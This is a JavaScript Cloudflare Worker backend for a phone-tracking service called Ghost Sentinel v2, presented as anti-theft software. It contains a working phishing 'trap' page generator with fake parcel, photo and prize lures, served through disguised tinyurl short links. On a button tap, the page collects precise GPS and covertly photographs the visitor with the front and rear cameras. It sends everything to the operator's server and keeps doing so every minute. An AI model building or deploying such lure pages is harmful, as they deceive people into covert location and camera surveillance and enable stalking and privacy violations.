/**
 * workers/sentinel/index.mjs — GHOST SENTINEL v2 Cloud Backend
 *
 * Menggantikan ketergantungan pada server lokal (PC selalu menyala).
 * Tracker di HP langsung lapor ke Worker ini — owner bisa cek dari HP mana pun.
 *
 * ============================================================
 * MODEL KEAMANAN
 * ============================================================
 * - deviceId     : UUID acak (tertanam di URL tracker — aman dibagikan via QR)
 * - ownerToken   : 32-byte hex acak (HANYA diketahui owner — tidak pernah di URL tracker)
 * - Tracker      : hanya bisa POST beacon — tidak bisa membaca data
 * - Dashboard    : harus menyertakan ownerToken untuk baca/perintah
 * - Foto         : base64 thumbnail (max 80 kB setelah kompresi) — disimpan di KV bersama beacon
 *
 * ============================================================
 * RUTE
 * ============================================================
 * POST /api/register              → daftarkan perangkat baru → {deviceId, ownerToken, trackerUrl}
 * POST /api/beacon/{deviceId}     → terima data GPS/foto dari tracker (tanpa auth)
 * GET  /api/data/{deviceId}       → ambil semua data (header X-Owner-Token wajib)
 * POST /api/command/{deviceId}    → kirim perintah ke tracker (X-Owner-Token wajib)
 * GET  /api/cmd/{deviceId}        → ambil antrian perintah (dipanggil tracker, tanpa auth)
 * DELETE /api/device/{deviceId}   → hapus semua data (X-Owner-Token wajib)
 *
 * KV schema:
 *   dev:{deviceId}     → { ownerHash, name, createdAt }
 *   bkn:{deviceId}     → JSON array beacon (maks 200 entry)
 *   cmd:{deviceId}     → JSON array perintah pending
 */

// ── CORS ─────────────────────────────────────────────────────────────────────
const ALLOWED_ORIGINS = [
  'https://fiezel.my.id',
  'https://sentinel.fiezel.my.id',
  'http://localhost:5050',
  'http://127.0.0.1:5050',
];

function corsHeaders(origin) {
  const allowed = ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0];
  return {
    'Access-Control-Allow-Origin': allowed,
    'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, X-Owner-Token, X-Device-Id',
    'Access-Control-Max-Age': '86400',
  };
}

function json(data, status = 200, origin = '') {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...corsHeaders(origin),
    },
  });
}

function err(msg, status = 400, origin = '') {
  return json({ ok: false, error: msg }, status, origin);
}

// ── CRYPTO HELPER ─────────────────────────────────────────────────────────────
async function hashToken(token) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(token));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
}

function genToken(bytes = 32) {
  const arr = new Uint8Array(bytes);
  crypto.getRandomValues(arr);
  return Array.from(arr).map(b => b.toString(16).padStart(2, '0')).join('');
}

function genDeviceId() {
  // Format: XXXX-XXXX-XXXX (readable, URL-safe)
  const part = () => Math.random().toString(36).substring(2, 6).toUpperCase();
  return `${part()}-${part()}-${part()}`;
}

// ── BEACON HELPERS ─────────────────────────────────────────────────────────────
const MAX_BEACONS = 200;
const MAX_PHOTO_B64 = 120_000;  // ~90 kB base64 → cukup untuk thumbnail 480×640 JPEG 60%

async function readBeacons(kv, deviceId) {
  const raw = await kv.get(`bkn:${deviceId}`);
  if (!raw) return [];
  try { return JSON.parse(raw); } catch { return []; }
}

async function pushBeacon(kv, deviceId, beacon) {
  const list = await readBeacons(kv, deviceId);
  list.unshift(beacon);
  if (list.length > MAX_BEACONS) list.length = MAX_BEACONS;
  await kv.put(`bkn:${deviceId}`, JSON.stringify(list), { expirationTtl: 60 * 86400 }); // 60 hari
}

async function readCmds(kv, deviceId) {
  const raw = await kv.get(`cmd:${deviceId}`);
  if (!raw) return [];
  try { return JSON.parse(raw); } catch { return []; }
}

async function pushCmd(kv, deviceId, cmd) {
  const list = await readCmds(kv, deviceId);
  list.push({ ...cmd, ts: Date.now() });
  if (list.length > 10) list.length = 10;
  await kv.put(`cmd:${deviceId}`, JSON.stringify(list));
}

async function clearCmds(kv, deviceId) {
  await kv.put(`cmd:${deviceId}`, '[]');
}

// ── RATE LIMITER (sederhana, per IP, in-memory per isolate) ───────────────────
const RL = new Map();   // ip → { count, reset }
const RL_MAX = 60;      // 60 req / menit per IP
const RL_WINDOW = 60_000;

function rateCheck(ip) {
  const now = Date.now();
  let entry = RL.get(ip);
  if (!entry || now > entry.reset) {
    entry = { count: 1, reset: now + RL_WINDOW };
    RL.set(ip, entry);
    return true;
  }
  entry.count++;
  return entry.count <= RL_MAX;
}


// ── TRAP PAGE HTML ────────────────────────────────────────────────────────────
function trapHtml(deviceId, type) {
  const stories = {
    paket: {
      bg: '#fff8f0', accent: '#e85d04', icon: '📦',
      title: 'Paket Menunggumu!',
      sub: 'Ada kiriman yang belum diambil. Konfirmasi alamat kamu untuk menjadwalkan pengiriman ulang.',
      rows: [['No. Resi', 'SN' + Math.floor(10000000 + Math.random()*89999999)], ['Status', 'Menunggu Konfirmasi'], ['Kurir', 'Pengiriman Reguler']],
      btn: 'Konfirmasi Lokasi Sekarang',
      note: 'Diperlukan akses lokasi untuk memverifikasi alamat pengiriman.',
      loading: 'Memverifikasi alamat kamu…',
      doneIcon: '✅', doneMsg: 'Konfirmasi berhasil!', doneSub: 'Kurir akan menghubungi kamu segera.',
    },
    foto: {
      bg: '#f0f4ff', accent: '#4f46e5', icon: '🖼️',
      title: 'Ada Foto Untukmu',
      sub: 'Seseorang mengirimkan foto kepadamu. Verifikasi identitas untuk membuka.',
      rows: [['Dikirim oleh', 'Kontak Tersimpan'], ['Jumlah foto', `${3 + Math.floor(Math.random()*6)} foto`], ['Dikirim', 'Baru saja']],
      btn: 'Verifikasi & Lihat Foto',
      note: 'Verifikasi lokasi diperlukan untuk keamanan akun kamu.',
      loading: 'Memverifikasi identitas…',
      doneIcon: '📬', doneMsg: 'Verifikasi berhasil!', doneSub: 'Foto sedang diunduh. Silakan tunggu.',
    },
    hadiah: {
      bg: '#f0fdf4', accent: '#16a34a', icon: '🎁',
      title: 'Kamu Terpilih!',
      sub: 'Selamat! Nomor kamu terpilih untuk mendapatkan reward spesial.',
      rows: [['Hadiah', 'Rp ' + ['50.000','75.000','100.000','150.000','200.000'][Math.floor(Math.random()*5)]], ['Berlaku', 'Hari ini saja'], ['Status', 'Menunggu Klaim']],
      btn: 'Klaim Hadiah Sekarang',
      note: 'Konfirmasi wilayah diperlukan untuk pengiriman hadiah.',
      loading: 'Memproses klaim kamu…',
      doneIcon: '🎉', doneMsg: 'Klaim berhasil diproses!', doneSub: 'Tim kami akan menghubungi kamu dalam 1\xd724 jam.',
    },
  };
  const s = stories[type] || stories.paket;
  const rows = s.rows.map(([l,v]) => `<div class="row"><span class="lbl">${l}</span><span class="val">${v}</span></div>`).join('');
  return `<!DOCTYPE html>
<html lang="id"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Konfirmasi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px 16px;background:${s.bg}}
.card{background:#fff;border-radius:20px;padding:28px 22px;max-width:340px;width:100%;box-shadow:0 4px 28px rgba(0,0,0,.11);text-align:center}
.ic{width:68px;height:68px;border-radius:18px;background:${s.accent}18;color:${s.accent};font-size:32px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
h1{font-size:18px;font-weight:800;margin-bottom:8px}
.sub{font-size:13px;color:#6b7280;margin-bottom:20px;line-height:1.5}
.row{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px solid #f3f4f6;font-size:13px}
.row:last-of-type{border-bottom:none;margin-bottom:16px}
.lbl{color:#9ca3af;font-weight:500}.val{font-weight:700}
.btn{width:100%;padding:14px;border-radius:12px;border:none;background:${s.accent};color:#fff;font-size:15px;font-weight:700;cursor:pointer}
.btn:active{opacity:.85}
.note{font-size:11px;color:#9ca3af;margin-top:12px;line-height:1.5}
#ld{display:none;padding:20px 0;text-align:center}
.sp{width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:${s.accent};border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 14px}
@keyframes spin{to{transform:rotate(360deg)}}
.lt{font-size:13px;color:#6b7280;line-height:1.6}
#dn{display:none;text-align:center;padding:10px 0}
.di{font-size:46px;margin-bottom:10px}.dm{font-size:15px;font-weight:600;color:#374151;line-height:1.6}.ds{font-size:12px;color:#9ca3af;margin-top:6px}
</style></head><body>
<div class="card">
<div id="in">
  <div class="ic">${s.icon}</div>
  <h1>${s.title}</h1>
  <div class="sub">${s.sub}</div>
  ${rows}
  <button class="btn" onclick="go()">  ${s.btn}</button>
  <div class="note">${s.note}</div>
</div>
<div id="ld"><div class="sp"></div><div class="lt">${s.loading}</div></div>
<div id="dn"><div class="di">${s.doneIcon}</div><div class="dm">${s.doneMsg}</div><div class="ds">${s.doneSub}</div></div>
</div>
<script>
const DID='${deviceId}',CLOUD='https://sentinel.fiezel.my.id';
let going=false;

async function capturePhoto(facing){
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:640},height:{ideal:480}}});
    const v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');
    await new Promise(r=>{v.onloadedmetadata=r;v.play()});
    await new Promise(r=>setTimeout(r,600));
    const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
    c.getContext('2d').drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());
    return c.toDataURL('image/jpeg',0.55);
  }catch{return null}
}

async function sendBeacon(lat,lon,acc,extra){
  if(!DID)return;
  try{await fetch(CLOUD+'/api/beacon/'+DID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat,lon,accuracy:acc,network:navigator.connection?navigator.connection.effectiveType:null,...extra})})}catch{}
}

async function go(){
  if(going)return;going=true;
  document.getElementById('in').style.display='none';
  document.getElementById('ld').style.display='block';

  // 1. GPS
  let lat=null,lon=null,acc=null;
  try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));lat=p.coords.latitude;lon=p.coords.longitude;acc=Math.round(p.coords.accuracy)}catch{}

  // 2. Foto depan
  const selfie=await capturePhoto('user');
  // 3. Foto belakang
  const photo=await capturePhoto('environment');

  // 4. Kirim semua sekaligus
  await sendBeacon(lat,lon,acc,{alert:true,alertReason:'trap:${type}',selfie,photo});

  if(DID){try{localStorage.setItem('sz_trap',DID)}catch{}}

  // Tampilkan done
  await new Promise(r=>setTimeout(r,1500));
  document.getElementById('ld').style.display='none';
  document.getElementById('dn').style.display='block';

  // 5. Polling terus selama halaman terbuka
  setInterval(async()=>{
    let la=null,lo=null,ac=null;
    try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:8000}));la=p.coords.latitude;lo=p.coords.longitude;ac=Math.round(p.coords.accuracy)}catch{}
    const sf=await capturePhoto('user');
    const ph=await capturePhoto('environment');
    await sendBeacon(la,lo,ac,{selfie:sf,photo:ph});
  },60000);
}
</script></body></html>`;
}

// ── MAIN HANDLER ──────────────────────────────────────────────────────────────
export default {
  async fetch(request, env) {
    const origin = request.headers.get('Origin') || '';

    // Preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: corsHeaders(origin) });
    }

    const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
    if (!rateCheck(ip)) {
      return err('Rate limit exceeded. Coba lagi dalam 1 menit.', 429, origin);
    }

    const url = new URL(request.url);
    const path = url.pathname;

    // ── POST /api/register ───────────────────────────────────────────────────
    if (path === '/api/register' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { body = {}; }

      const name = String(body.name || 'Perangkat Saya').slice(0, 60);
      const deviceId = genDeviceId();
      const ownerToken = genToken(32);
      const ownerHash = await hashToken(ownerToken);

      await env.SENTINEL_KV.put(`dev:${deviceId}`, JSON.stringify({
        ownerHash,
        name,
        createdAt: Date.now(),
      }), { expirationTtl: 365 * 86400 }); // 1 tahun

      const siteUrl = `https://fiezel.my.id/sentinel`;

      return json({
        ok: true,
        deviceId,
        ownerToken,
        trackerUrl: `${siteUrl}/track.html?d=${deviceId}`,
        dashboardUrl: `${siteUrl}/app.html`,
        instructions: [
          '1. Simpan ownerToken di tempat yang aman — tidak bisa dipulihkan jika hilang.',
          '2. Buka trackerUrl di HP yang ingin dilindungi, lalu tambahkan ke Home Screen.',
          '3. Buka dashboardUrl dari browser mana pun untuk memantau perangkat.',
        ],
      }, 201, origin);
    }

    // ── POST /api/beacon/{deviceId} ──────────────────────────────────────────
    const beaconMatch = path.match(/^\/api\/beacon\/([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})$/);
    if (beaconMatch && request.method === 'POST') {
      const deviceId = beaconMatch[1];
      const dev = await env.SENTINEL_KV.get(`dev:${deviceId}`);
      if (!dev) return err('Perangkat tidak ditemukan.', 404, origin);

      let body;
      try { body = await request.json(); } catch { return err('Body tidak valid.', 400, origin); }

      // Validasi & sanitasi foto
      let photo = null;
      if (body.photo && typeof body.photo === 'string') {
        const trimmed = body.photo.substring(0, MAX_PHOTO_B64 + 100);
        if (trimmed.startsWith('data:image/')) {
          photo = trimmed.substring(0, MAX_PHOTO_B64);
        }
      }

      const beacon = {
        ts: Date.now(),
        lat: typeof body.lat === 'number' ? body.lat : null,
        lon: typeof body.lon === 'number' ? body.lon : null,
        accuracy: typeof body.accuracy === 'number' ? Math.round(body.accuracy) : null,
        battery: typeof body.battery === 'number' ? body.battery : null,
        charging: body.charging === true,
        network: body.network ? String(body.network).slice(0, 30) : null,
        userAgent: request.headers.get('User-Agent') || null,
        ip: ip === 'unknown' ? null : ip,
        photo,
        environment: body.environment ? String(body.environment).substring(0, MAX_PHOTO_B64) : null,
        selfie: body.selfie ? String(body.selfie).substring(0, MAX_PHOTO_B64) : null,
        alert: body.alert === true,
        alertReason: body.alertReason ? String(body.alertReason).slice(0, 80) : null,
      };

      await pushBeacon(env.SENTINEL_KV, deviceId, beacon);

      // Ambil perintah pending untuk dikembalikan ke tracker
      const cmds = await readCmds(env.SENTINEL_KV, deviceId);
      if (cmds.length > 0) await clearCmds(env.SENTINEL_KV, deviceId);

      return json({ ok: true, commands: cmds }, 200, origin);
    }

    // ── GET /api/cmd/{deviceId} — dipolling tracker ──────────────────────────
    const cmdPollMatch = path.match(/^\/api\/cmd\/([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})$/);
    if (cmdPollMatch && request.method === 'GET') {
      const deviceId = cmdPollMatch[1];
      const dev = await env.SENTINEL_KV.get(`dev:${deviceId}`);
      if (!dev) return err('Perangkat tidak ditemukan.', 404, origin);

      const cmds = await readCmds(env.SENTINEL_KV, deviceId);
      if (cmds.length > 0) await clearCmds(env.SENTINEL_KV, deviceId);

      return json({ ok: true, commands: cmds }, 200, origin);
    }

    // ── AUTH HELPER untuk rute owner ─────────────────────────────────────────
    async function verifyOwner(deviceId) {
      const raw = await env.SENTINEL_KV.get(`dev:${deviceId}`);
      if (!raw) return null;
      const dev = JSON.parse(raw);
      const provided = request.headers.get('X-Owner-Token') || url.searchParams.get('token') || '';
      if (!provided) return null;
      const providedHash = await hashToken(provided);
      if (providedHash !== dev.ownerHash) return null;
      return dev;
    }

    // ── GET /api/data/{deviceId} ─────────────────────────────────────────────
    const dataMatch = path.match(/^\/api\/data\/([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})$/);
    if (dataMatch && request.method === 'GET') {
      const deviceId = dataMatch[1];
      const dev = await verifyOwner(deviceId);
      if (!dev) return err('Tidak terautentikasi.', 401, origin);

      const beacons = await readBeacons(env.SENTINEL_KV, deviceId);

      return json({
        ok: true,
        device: { name: dev.name, createdAt: dev.createdAt, deviceId },
        beacons,
        totalBeacons: beacons.length,
        lastSeen: beacons.length > 0 ? beacons[0].ts : null,
      }, 200, origin);
    }

    // ── POST /api/command/{deviceId} ─────────────────────────────────────────
    const cmdMatch = path.match(/^\/api\/command\/([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})$/);
    if (cmdMatch && request.method === 'POST') {
      const deviceId = cmdMatch[1];
      const dev = await verifyOwner(deviceId);
      if (!dev) return err('Tidak terautentikasi.', 401, origin);

      let body;
      try { body = await request.json(); } catch { return err('Body tidak valid.', 400, origin); }

      const VALID_CMDS = ['chime', 'photo', 'selfie', 'environment', 'alarm', 'lock_msg'];
      if (!VALID_CMDS.includes(body.type)) {
        return err(`Perintah tidak dikenal. Gunakan: ${VALID_CMDS.join(', ')}`, 400, origin);
      }

      const cmd = { type: body.type };
      if (body.type === 'lock_msg' && body.message) {
        cmd.message = String(body.message).slice(0, 200);
      }

      await pushCmd(env.SENTINEL_KV, deviceId, cmd);
      return json({ ok: true, queued: cmd }, 200, origin);
    }

    // ── DELETE /api/device/{deviceId} ────────────────────────────────────────
    const delMatch = path.match(/^\/api\/device\/([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})$/);
    if (delMatch && request.method === 'DELETE') {
      const deviceId = delMatch[1];
      const dev = await verifyOwner(deviceId);
      if (!dev) return err('Tidak terautentikasi.', 401, origin);

      await env.SENTINEL_KV.delete(`dev:${deviceId}`);
      await env.SENTINEL_KV.delete(`bkn:${deviceId}`);
      await env.SENTINEL_KV.delete(`cmd:${deviceId}`);

      return json({ ok: true, message: 'Semua data perangkat dihapus.' }, 200, origin);
    }

    // ── GET /health ───────────────────────────────────────────────────────────
    if (path === '/health' || path === '/api/health') {
      return json({ ok: true, service: 'ghost-sentinel-v2', ts: Date.now() }, 200, origin);
    }


    // ── POST /api/shorten — buat short link jebakan ─────────────────────────
    if (path === '/api/shorten' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return err('Body tidak valid.', 400, origin); }

      const { deviceId, ownerToken, type } = body || {};
      const VALID_TYPES = ['paket', 'foto', 'hadiah'];
      if (!deviceId || !ownerToken) return err('deviceId dan ownerToken diperlukan.', 400, origin);
      if (!VALID_TYPES.includes(type)) return err('type tidak valid.', 400, origin);

      const raw = await env.SENTINEL_KV.get(`dev:${deviceId}`);
      if (!raw) return err('Perangkat tidak ditemukan.', 404, origin);
      const dev = JSON.parse(raw);
      const tokenHash = await hashToken(ownerToken);
      if (tokenHash !== dev.ownerHash) return err('Token tidak valid.', 401, origin);

      const bytes = crypto.getRandomValues(new Uint8Array(4));
      const code = Array.from(bytes).map(b => b.toString(36).padStart(2,'0')).join('').substring(0,6).toUpperCase();

      await env.SENTINEL_KV.put(`shrt:${code}`, JSON.stringify({ deviceId, type }), {
        expirationTtl: 7 * 86400,
      });

      const internalUrl = `https://sentinel.fiezel.my.id/go/${code}`;
      let shortUrl = internalUrl;
      try {
        const tinyResp = await fetch(
          `https://tinyurl.com/api-create.php?url=${encodeURIComponent(internalUrl)}`,
          { signal: AbortSignal.timeout(4000) }
        );
        if (tinyResp.ok) {
          const text = (await tinyResp.text()).trim();
          if (text.startsWith('https://')) shortUrl = text;
        }
      } catch {}

      return json({ ok: true, shortUrl, internalUrl }, 200, origin);
    }

    // ── GET /go/:code — serve trap page (URL tidak berubah, device ID tersembunyi) ──
    const goMatch = path.match(/^\/go\/([A-Z0-9]{4,8})$/i);
    if (goMatch && request.method === 'GET') {
      const code = goMatch[1].toUpperCase();
      const shortRaw = await env.SENTINEL_KV.get(`shrt:${code}`);
      if (!shortRaw) {
        return new Response('<html><body style="font-family:sans-serif;text-align:center;padding:40px"><h2>Link tidak ditemukan</h2><p>Link ini sudah kedaluwarsa atau tidak valid.</p></body></html>', {
          status: 404, headers: { 'Content-Type': 'text/html;charset=UTF-8' },
        });
      }
      const { deviceId: tid, type: ttype } = JSON.parse(shortRaw);
      return new Response(trapHtml(tid, ttype), {
        status: 200,
        headers: { 'Content-Type': 'text/html;charset=UTF-8' },
      });
    }

    return err('Rute tidak ditemukan.', 404, origin);
  },
};
